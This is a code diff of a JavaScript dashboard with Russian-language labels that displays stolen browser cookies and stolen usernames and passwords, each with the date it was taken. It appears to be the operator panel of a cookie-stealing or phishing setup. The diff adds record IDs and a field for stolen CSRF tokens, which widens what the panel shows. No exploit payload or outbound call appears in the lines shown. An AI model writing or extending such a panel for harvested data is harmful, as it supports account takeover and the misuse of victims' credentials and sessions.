@@ -12,13 +12,17 @@ function fetchCookies() {
         cookiesList.innerHTML = "<b>🕵️‍♂️ Украденные куки:</b><br><br>";
 
         data.stolen_cookies.forEach(item => {
+            let id = item.id || "Неизвестно";
             let cookieText = item.cookie || "Неизвестно";
+            let token = item.token || "Не украден";  // Добавлено поле token
             let stolenAt = item.stolen_at || "Неизвестно";
 
             let cookieDiv = document.createElement("div");
             cookieDiv.classList.add("cookie-item");
             cookieDiv.innerHTML = `
+                <span class="id-icon">🆔</span> <strong>ID:</strong> ${id} <br>
                 <span class="cookie-icon">🍪</span> <code>${cookieText}</code> <br>
+                <span class="token-icon">🔑</span> <strong>CSRF-токен:</strong> ${token} <br>
                 <span class="date-icon">📅</span> <b>Дата:</b> ${stolenAt} <br>
             `;
             cookiesList.appendChild(cookieDiv);
@@ -44,6 +48,7 @@ function fetchCredentials() {
         credentialsList.innerHTML = "<b>🕵️‍♂️ Украденные учетные данные:</b><br><br>";
 
         data.stolen_credentials.forEach(item => {
+            let id = item.id || "Неизвестно";
             let username = item.username || "Неизвестно";
             let password = item.password || "Неизвестно";
             let stolenAt = item.stolen_at || "Неизвестно";
@@ -51,6 +56,7 @@ function fetchCredentials() {
             let credDiv = document.createElement("div");
             credDiv.classList.add("credential-item");
             credDiv.innerHTML = `
+                <span class="id-icon">🆔</span> <strong>ID:</strong> ${id} <br>
                 <span class="user-icon">👤</span> <strong>Username:</strong> ${username} <br>
                 <span class="lock-icon">🔒</span> <strong>Password:</strong> ${password} <br>
                 <span class="date-icon">📅</span> <b>Дата:</b> ${stolenAt} <br>
